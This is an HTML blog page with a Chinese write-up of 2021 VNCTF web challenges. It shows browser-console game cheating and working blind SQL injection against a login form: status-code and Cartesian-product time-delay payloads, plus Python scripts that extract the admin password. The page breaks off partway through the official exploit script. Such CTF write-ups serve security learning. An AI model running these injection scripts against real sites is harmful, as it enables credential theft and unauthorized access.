@@ -1,0 +1,559 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2021-VNCTF-Web-Writeup | upload</title><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021-VNCTF-Web-Writeup">
+<meta property="og:url" content="http://upload.love/2021/03/23/2021-VNCTF-Web-Writeup/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://upload.love/image/20210317105006.jpg">
+<meta property="article:published_time" content="2021-03-23T06:14:30.000Z">
+<meta property="article:modified_time" content="2021-11-07T10:20:14.000Z">
+<meta property="article:author" content="upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload.love/image/20210317105006.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/03/23/2021-VNCTF-Web-Writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-11-07 18:20:14'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2021-VNCTF-Web-Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-23T06:14:30.000Z" title="发表于 2021-03-23 14:14:30">2021-03-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-07T10:20:14.000Z" title="更新于 2021-11-07 18:20:14">2021-11-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.top/img/avatar.jpg" alt="avatar"></p>
+<h1 id="2021-VNCTF-Web-Writeup"><a href="#2021-VNCTF-Web-Writeup" class="headerlink" title="2021 VNCTF Web Writeup"></a>2021 VNCTF Web Writeup</h1><p>Created2021-03-15|Updated2021-03-17|<a target="_blank" rel="noopener" href="https://whoamianony.top/categories/CTF/">CTF</a></p>
+<p>Word count:3.2k|Reading time:15min</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105006.jpg"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105006.jpg" alt="img"></a></p>
+<p>[toc]</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛太难了，Web 四分之三都是零解。</p>
+<h2 id="VNCTF-2021-Ez-game"><a href="#VNCTF-2021-Ez-game" class="headerlink" title="[VNCTF 2021]Ez_game"></a>[VNCTF 2021]Ez_game</h2><p>进入题目，是一个小游戏：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174151.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174151.png" alt="image-20210315165419850"></a></p>
+<p>只有三条命，通过就给flag。查看源码，发现注释里写道，游戏有十关：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174156.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174156.png" alt="image-20210315171059214"></a></p>
+<p>发现几个js，进入game.js，里面定义了一些游戏的属性。在PlayerData类中看到了人物的属性：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174146.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174146.png" alt="image-20210315171229304"></a></p>
+<p>在InitLevel()方法中发现声明了一个player对象：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174411.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174411.png" alt="image-20210315174356250"></a></p>
+<p>跟进Player()类：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174852.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174852.png" alt="image-20210315174457871"></a></p>
+<p>该类中依然有人物的那些属性。</p>
+<p>我们可以在控制台中修改player对象的属性，直接修改人物属性：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174134.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174134.png" alt="image-20210315171815542"></a></p>
+<p>我们尝试修改这些属性：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JS</span><br><span class="line">player.health &#x3D; 1000</span><br><span class="line">player.healthMax &#x3D; 1000</span><br><span class="line">player.boomerands &#x3D; 1000</span><br><span class="line">player.bigBoomerands &#x3D; 1000</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174124.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174124.png" alt="image-20210315172041312"></a></p>
+<p>好了，现在我们就无敌了，那就玩吧。</p>
+<p>玩到第三关的时候，发现死亡后重生时可以进入之前存档的一关。在 js 中找到疑似存档关卡的一个值 <code>localStorage.kbap_warp</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174119.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315174119.png" alt="image-20210315172637554"></a></p>
+<p>设置 <code>localStorage.kbap_warp</code> 为 10，这样我们死亡后去进入存档，就可以直接打 boss 战了：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315173923.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315173923.png" alt="image-20210315172951280"></a></p>
+<p>打死boss得到flag：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315173918.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315173918.png" alt="image-20210315173808150"></a></p>
+<h2 id="VNCTF-2021-realezjvav"><a href="#VNCTF-2021-realezjvav" class="headerlink" title="[VNCTF 2021]realezjvav"></a>[VNCTF 2021]realezjvav</h2><p>进入题目，一个登录框：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105018.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105018.png" alt="image-20210315175402880"></a></p>
+<p>说只有admin才可以登录这个页面。</p>
+<h3 id="基于状态码的盲注"><a href="#基于状态码的盲注" class="headerlink" title="基于状态码的盲注"></a>基于状态码的盲注</h3><p>在password处发现sql注入。输入一个单引号，报错500：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315181058.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315181058.png" alt="image-20210315181016411"></a></p>
+<p>输入双引号，不报错，返回200：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315181107.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315181107.png" alt="image-20210315181049733"></a></p>
+<p>应该存在sql盲注，根据返回的状态码进行判断。再测试一波：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;&#39;    # 报错, 返回500</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;&#39;#    # 不报错, 返回200</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;123&#39; and 1&#x3D;2#    # 不报错, 返回200</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;123&#39; or 1&#x3D;1#    # 不报错, 返回200</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;123&#39;#    # 不报错, 返回200</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;&#39; #</span><br></pre></td></tr></table></figure>
+
+<p>猜测后端的查询语句应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL</span><br><span class="line">select * from user where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>既然500是一个服务器端的错误，如果想让他报500，就需要使MySQL发生错误，也就是构造错误的mysql语句。那我们这里就可以使用if()语句了，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL</span><br><span class="line">select if((select 1), 1, (select 1 from mysql.user));</span><br><span class="line"># 输出: 1</span><br><span class="line"></span><br><span class="line">select if((select 0), 1, (select 1 from mysql.user));</span><br><span class="line"># 报错: ERROR 1242 (21000): Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105024.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105024.png" alt="image-20210315182823975"></a></p>
+<p>根据这个原理，我们可以使用if()语句来构造500报错了，类似如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;&#39; or if((select 1), 1, (select 1 from mysql.user))#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP&#x2F;1.1 200</span><br><span class="line"></span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;&#39; or if((select 0), 1, (select 1 from mysql.user))#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP&#x2F;1.1 500</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105029.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105029.png" alt="image-20210315183035322"></a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105033.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105033.png" alt="image-20210315183141726"></a></p>
+<p>根据这个原理写出最终的sql盲注exp脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82&#x2F;user&#x2F;login&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low &#x3D; 32</span><br><span class="line">   high &#x3D; 128</span><br><span class="line">   mid &#x3D; (low+high)&#x2F;&#x2F;2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       #payload &#x3D; &quot;&#39; or if((select ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1)))&gt;%d,1,(select 1 from mysql.user))#&quot; %(i,mid)</span><br><span class="line">       #payload &#x3D; &quot;&#39; or if((select ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39;),%d,1)))&gt;%d,1,(select 1 from mysql.user))#&quot; %(i,mid)</span><br><span class="line">       payload &#x3D; &quot;&#39; or if((select ascii(substr((select password from user where username&#x3D;&#39;admin&#39;),%d,1)))&gt;%d,1,(select 1 from mysql.user))#&quot; % (i, mid)</span><br><span class="line">       datas &#x3D; &#123;</span><br><span class="line">                &quot;username&quot;:&quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res &#x3D; requests.post(url&#x3D;url,data&#x3D;datas)</span><br><span class="line"></span><br><span class="line">       if res.status_code &#x3D;&#x3D; 200:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low &#x3D; mid+1</span><br><span class="line">       else:</span><br><span class="line">           high &#x3D; mid</span><br><span class="line">       mid &#x3D; (low+high)&#x2F;&#x2F;2</span><br><span class="line">   if(mid &#x3D;&#x3D;32 or mid &#x3D;&#x3D;127):</span><br><span class="line">       break</span><br><span class="line">   flag &#x3D; flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105038.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105038.png" alt="image-20210315184515553"></a></p>
+<p>得到admin的密码为 “no_0ne_kn0w_th1s”。</p>
+<h3 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h3><p>这个题也可以使用延时注入，但是由于sleep()函数被过滤了，所以我们要是用笛卡尔积进行延时注入。</p>
+<p><strong>笛卡尔积延时注入</strong></p>
+<p><code>count(*)</code> 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL</span><br><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br></pre></td></tr></table></figure>
+
+<p>得到的结果都会有延迟。</p>
+<p>那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL</span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;1&#39; and if((select 1),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP&#x2F;1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span><br><span class="line"></span><br><span class="line">username&#x3D;whoami&amp;password&#x3D;1&#39; and if((select 0),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP&#x2F;1.1 200    # 没有延时</span><br></pre></td></tr></table></figure>
+
+<p>最后给出笛卡尔积延时注入的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82&#x2F;user&#x2F;login&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low &#x3D; 32</span><br><span class="line">   high &#x3D; 128</span><br><span class="line">   mid &#x3D; (low+high)&#x2F;&#x2F;2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       #payload &#x3D; &quot;&#39; or if((select ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; %(i,mid)</span><br><span class="line">       #payload &#x3D; &quot;&#39; or if((select ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; %(i,mid)</span><br><span class="line">       payload &#x3D; &quot;&#39; or if((select ascii(substr((select password from user where username&#x3D;&#39;admin&#39;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; % (i, mid)</span><br><span class="line">       datas &#x3D; &#123;</span><br><span class="line">                &quot;username&quot;:&quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res &#x3D; requests.post(url&#x3D;url,data&#x3D;datas,timeout&#x3D;None)    # 不限制超时</span><br><span class="line"></span><br><span class="line">       if &#39;504 Gateway Time-out&#39; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low &#x3D; mid+1</span><br><span class="line">       else:</span><br><span class="line">           high &#x3D; mid</span><br><span class="line">       mid &#x3D; (low+high)&#x2F;&#x2F;2</span><br><span class="line">   if(mid &#x3D;&#x3D;32 or mid &#x3D;&#x3D;127):</span><br><span class="line">       break</span><br><span class="line">   flag &#x3D; flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>官方exp：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">-*- coding: utf-8 -*-</span><br><span class="line">@File: exp.py</span><br><span class="line">@Author: gyy</span><br><span class="line">@Time: 3月 14, 2021</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82&#x2F;user&#x2F;login&quot;</span><br><span class="line"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span><br><span class="line"></span><br><span class="line">def req(payload):</span><br><span class="line">    payload &#x3D; payload.replace(&quot; &quot;, &quot;&#x2F;**&#x2F;&quot;)</span><br><span class="line">    print(payload)</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">        &quot;password&quot;: payload</span><br><span class="line">    &#125;</span><br><span class="line">    url1 &#x3D; url.format(random.randrange(1,5,1)) # 随机访问</span><br><span class="line">    # print(url1)</span><br><span class="line">    res &#x3D; requests.post(url&#x3D;url1, data&#x3D;data, timeout&#x3D;None)# 不限制超时</span><br><span class="line">    # print(res.text)</span><br><span class="line">    if &quot;504 Gateway Time-out&quot; in res.text: # 504即为正确</span><br><span class="line">        return 1</span><br><span class="line">    else:</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binary_search(payload):  # 二分法~</span><br><span class="line">    # payload &#x3D; payload.replace(&quot;&#x3D;&quot;,&quot;&gt;&#x3D;&quot;)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    while True:</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        if (high - low) &lt; 4:</span><br><span class="line">            for mid in range(low, high + 1):</span><br><span class="line">                time.sleep(0.05)</span><br><span class="line">                if 